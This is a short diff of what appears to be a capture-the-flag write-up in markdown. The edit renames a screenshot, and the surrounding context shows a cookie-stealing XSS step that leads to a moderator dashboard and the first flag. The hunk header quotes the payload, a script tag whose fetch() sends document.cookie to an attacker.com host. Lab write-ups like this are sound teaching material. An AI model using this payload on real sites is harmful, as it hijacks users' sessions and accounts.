@@ -88,7 +88,7 @@ used xss payload - `<script>fetch('http://attacker.com/file?cookie='+document.co
 
 ![Contact form after message submission](screenshots/sequence-5.png)
 
-![Listener received the callback](screenshots/sequence-15.png)
+![Listener received the callback](screenshots/sequence-6.png)
 
 After replacing my session cookie, I reached the moderator dashboard and retrieved the **first flag**.
 
